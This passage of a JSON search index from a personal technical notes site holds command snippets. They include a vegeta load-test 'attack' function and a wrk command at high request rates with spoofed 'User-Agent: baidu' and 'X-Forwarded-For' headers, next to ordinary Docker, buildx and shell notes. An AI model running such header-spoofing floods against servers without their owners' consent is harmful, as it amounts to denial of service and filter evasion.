style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eattack\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;GET \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e1\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e |\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        vegeta attack -duration\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e100s -header\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;User-Agent: baidu\u0026#34;\u003c/span\u003e -header\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;X-Forwarded-For: 47.0.0.1\u0026#34;\u003c/span\u003e -rate\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e500\u003c/span\u003e -timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e1s |\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        vegeta encode |\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        jaggr @count\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003erps \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e            hist\u003cspan style=\"color:#ae81ff\"\u003e\\[\u003c/span\u003e100,200,300,400,500\u003cspan style=\"color:#ae81ff\"\u003e\\]\u003c/span\u003e:code \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e            p25,p50,p95:latency \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e            sum:bytes_in \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e            sum:bytes_out |\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        jplot rps+code.hist.100+code.hist.200+code.hist.300+code.hist.400+code.hist.500 \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e            latency.p95+latency.p50+latency.p25 \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e            bytes_in.sum+bytes_out.sum\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[[\u003c/span\u003e -n \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e1\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    attack \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e1\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## -header=\u0026#34;Connection: Upgrade\u0026#34; -header=\u0026#34;Upgrade: websocket\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ewrk\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewrk -t10 -c1000 -d30s -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;User-Agent: baidu\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://default.hddv1.com/error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eVagrant with hyper-v provider\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEnable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCommon\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Find out processes swap usage command\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e file in /proc/*/status ; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/VmSwap|Name/{printf $2 \u0026#34; \u0026#34; $3}END{ print \u0026#34;\u0026#34;}\u0026#39;\u003c/span\u003e $file; \u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e | sort -k \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e -n -r | less\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eGitbook\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cp\u003eHide gitbook sidebar default.\u003c/p\u003e","tags":null,"title":"Common Command"},{"categories":null,"contents":" Diagrams https://diagrams.mingrammer.com/docs/getting-started/installation ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/docs/diagrams/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eDiagrams\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ca href=\"https://diagrams.mingrammer.com/docs/getting-started/installation\" target=\"_blank\" rel=\"noopener\"\u003ehttps://diagrams.mingrammer.com/docs/getting-started/installation\u003c/a\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Diagrams"},{"categories":null,"contents":" Build with secret Dockerfile # syntax = docker/dockerfile:1.6 FROM golang:1.21.1-alpine3.18 RUN --mount=type=secret,id=mysecret,target=/root/.ssh/id_rsa git clone git@gitlab.com:ricky/repo.git Command export DOCKER_BUILDKIT=1 docker build --secret id=mysecret,src=id_rsa -t image . Compose # Force pull image docker-compose up -d --pull always Create buildx instance # create buildx instance docker buildx create --name builder --bootstrap --driver docker-container # install emulators docker run --privileged --rm tonistiigi/binfmt --install all Create Network docker network create -d bridge --subnet 172.100.0.0/24 --gateway 172.100.0.1 backend_dev Multiple build-arg docker build . -f ./scripts/Dockerfile \\ --build-arg Date=$(date) \\ --build-arg Tag=$(git rev-list -n 1 --tags) \\ --build-arg Commit=$(git describe --tags --abbrev=0) \\ -t ops-cli Multiple platform # create and use buildx instance docker buildx create --use --name builder # build multiple platform docker buildx build --push --platform linux/arm64,linux/amd64 -t zeyanlin/ops-cli . Run container in different platform finch run -it --rm --platform=linux/arm64 zeyanlin/ops-cli /bin/sh ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/bash/docker/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eBuild with secret\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003eDockerfile\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# syntax = docker/dockerfile:1.6\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e golang:1.21.1-alpine3.18\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eRUN\u003c/span\u003e --mount\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etype\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003esecret,id\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emysecret,target\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/root/.ssh/id_rsa git clone git@gitlab.com:ricky/repo.git\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eCommand\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexport DOCKER_BUILDKIT\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build --secret id\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emysecret,src\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eid_rsa -t image .\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCompose\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Force pull image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-compose up -d --pull always\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCreate buildx instance\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create buildx instance\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker buildx create --name builder --bootstrap --driver docker-container\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# install emulators\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker run --privileged --rm tonistiigi/binfmt --install all\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCreate Network\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker network create -d bridge --subnet 172.100.0.0/24 --gateway 172.100.0.1 backend_dev\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eMultiple build-arg\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker build . -f ./scripts/Dockerfile \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --build-arg Date\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003edate\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --build-arg Tag\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003egit rev-list -n \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e --tags\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --build-arg Commit\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003egit describe --tags --abbrev\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e0\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  -t ops-cli\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eMultiple platform\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create and use buildx instance\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker buildx create --use --name builder\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# build multiple platform\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker buildx build --push --platform linux/arm64,linux/amd64 -t zeyanlin/ops-cli .\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eRun container in different platform\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efinch run -it --rm --platform\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003elinux/arm64 zeyanlin/ops-cli /bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Docker Command"},{"categories":null,"contents":" docker-compose cAdvisor docker-compose.yaml prometheus.yaml Elasticsearch docker-compose.yaml local dev docker-compose.yaml NodeJS docker-compose.yaml rstudio docker-compose.yaml rsyncd docker-compose.yaml rsyncd.conf rsyncd.secrets rsync -auz --password-file=/tmp/pass dist user@hostip::myshare Dockerfile awscli Dockerfile buildx Dockerfile docker buildx build --push --platform linux/arm64,linux/amd64 -t zeyanlin/app . dind Dockerfile golang Dockerfile docker build --secret id=mysecret,src=id_rsa -t app . goproxy Dockerfile docker buildx build -f goproxy/Dockerfile --platform linux/amd64,linux/arm64 -t zeyanlin/goproxy:latest --push . Gitlab-ci Dockerfile telegram.bash nginx Dockerfile docker-compose.yml nginx.conf rstudio Dockerfile pkg.txt supervisord Dockerfile supervisord.conf service with supervisord Dockerfile ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/docs/docker/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edocker-compose\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"cadvisor\"\u003ecAdvisor\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/cadvisor/docker-compose.yaml\"\u003edocker-compose.yaml\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/cadvisor/prometheus.yaml\"\u003eprometheus.yaml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"elasticsearch\"\u003eElasticsearch\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/elasticsearch/docker-compose.yaml\"\u003edocker-compose.yaml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"local-dev\"\u003elocal dev\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/local/docker-compose.yaml\"\u003edocker-compose.yaml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"nodejs\"\u003eNodeJS\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/nodejs/docker-compose.yaml\"\u003edocker-compose.yaml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"rstudio\"\u003erstudio\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/rstudio/docker-compose.yaml\"\u003edocker-compose.yaml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"rsyncd\"\u003ersyncd\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/rsyncd/docker-compose.yaml\"\u003edocker-compose.yaml\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/rsyncd/rsyncd.conf\"\u003ersyncd.conf\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/docker-compose/rsyncd/rsyncd.secrets\"\u003ersyncd.secrets\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ersync -auz --password-file=/tmp/pass dist user@hostip::myshare\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eDockerfile\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"awscli\"\u003eawscli\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/awscli/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"buildx\"\u003ebuildx\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/buildx/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edocker buildx build --push --platform linux/arm64,linux/amd64 -t zeyanlin/app .\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"dind\"\u003edind\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/dind/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"golang\"\u003egolang\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/golang/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edocker build --secret id=mysecret,src=id_rsa -t app .\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"goproxy\"\u003egoproxy\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/goproxy/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edocker buildx build -f goproxy/Dockerfile --platform linux/amd64,linux/arm64 -t zeyanlin/goproxy:latest --push .\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"gitlab-ci\"\u003eGitlab-ci\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/gitlab/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/gitlab/telegram.bash\"\u003etelegram.bash\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"nginx\"\u003e\u003ca href=\"https://github.com/macbre/docker-nginx-http3\" target=\"_blank\" rel=\"noopener\"\u003enginx\u003c/a\u003e\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/docker/dockerfile/nginx/Dockerfile\"\u003eDockerfile\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca 